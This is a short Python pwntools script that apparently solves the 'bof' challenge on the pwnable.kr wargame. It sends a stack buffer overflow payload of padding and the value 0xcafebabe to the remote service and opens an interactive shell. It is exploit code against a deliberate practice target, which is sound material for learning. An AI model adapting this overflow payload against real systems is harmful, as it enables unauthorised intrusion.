from pwn import *

payload = 'a'*0x2c + 'a'*0x8 + p32(0xcafebabe)

#r = process('./bof')
r = remote('pwnable.kr', 9000);

r.recvuntil('\n')

r.sendline(payload)

r.interactive()
